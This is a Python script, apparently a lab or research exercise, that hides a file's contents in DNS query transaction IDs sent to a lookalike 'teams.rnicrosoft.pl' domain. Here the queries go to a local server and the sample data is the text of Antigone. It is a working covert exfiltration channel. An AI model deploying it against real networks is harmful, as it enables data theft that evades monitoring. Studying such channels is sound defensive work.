import socket
import random
import time
from IO_ops import *
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE


SPECIAL_CHAR = 0x0000


def mix_two_chars_bits(chunk):
    bits1 = chunk[0:8]
    bits2 = chunk[8:]
    mixed = bits1[:4] + bits2[:4] + bits1[4:6] + bits2[4:6] + bits1[6:8] + bits2[6:8]
    return mixed

def modify_txid_based_on_last_bits(chunk):
    last_two_bits = chunk[-2:]
    last_two_int = int(last_two_bits, 2)
    
    if last_two_int % 2 == 0:
        return 1500
    else:
        return 850

def dns_query(txid, domain):
    return DNSRecord(
        DNSHeader(id=int(txid)),
        q=DNSQuestion(str(domain), QTYPE.A)
    )

def send_dns_query(filepath):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(2)
    
    text = read_file(filepath)
    if text is None:
        print(f"Error with reading data from a file {filepath}")
        return
    
    binary_list = text_to_binary_list(text)
    binary_data = ''.join(binary for _, binary in binary_list)

    # Start przesylania ukrytej wiadomosci
    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
    print(f"Sent START TXID: {SPECIAL_CHAR}")

    try:
        response, _ = client.recvfrom(512)
        print("Response received")
    except socket.timeout:
        print("No response received (timeout)")

    # Ukryte dane
    for i in range(0, len(binary_data), 16):
        chunk = binary_data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
        
        chunk = mix_two_chars_bits(chunk)
        # txid = int(chunk, 2) + int(modify_txid_based_on_last_bits(chunk)) # Konwersja bitów na int
        txid = int(chunk, 2) # Konwersja bitów na int

        
        client.sendto(dns_query(txid, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
        print(f"Sent TXID: {txid} (chunk: {chunk})")

        # Odbierz odpowiedz TTL i czekaj az minie TTL
        try:
            response, _ = client.recvfrom(512)
            dns_response = DNSRecord.parse(response)
            ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
            print(f"Received response, sleeping for {ttl} seconds")
            # time.sleep(ttl)
        except socket.timeout:
            print("No response received (timeout), sleeping for 1 second")
            # time.sleep(1)

    # Koniec przesylania ukrytej wiadomosci
    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
    print(f"Sent END TXID: {SPECIAL_CHAR}")

    try:
        response, _ = client.recvfrom(512)
        print("Response received")
    except socket.timeout:
        print("No response received (timeout)")


if __name__ == "__main__":
    filepath = "data/Sofokles-Antygona.txt"
    send_dns_query(filepath)
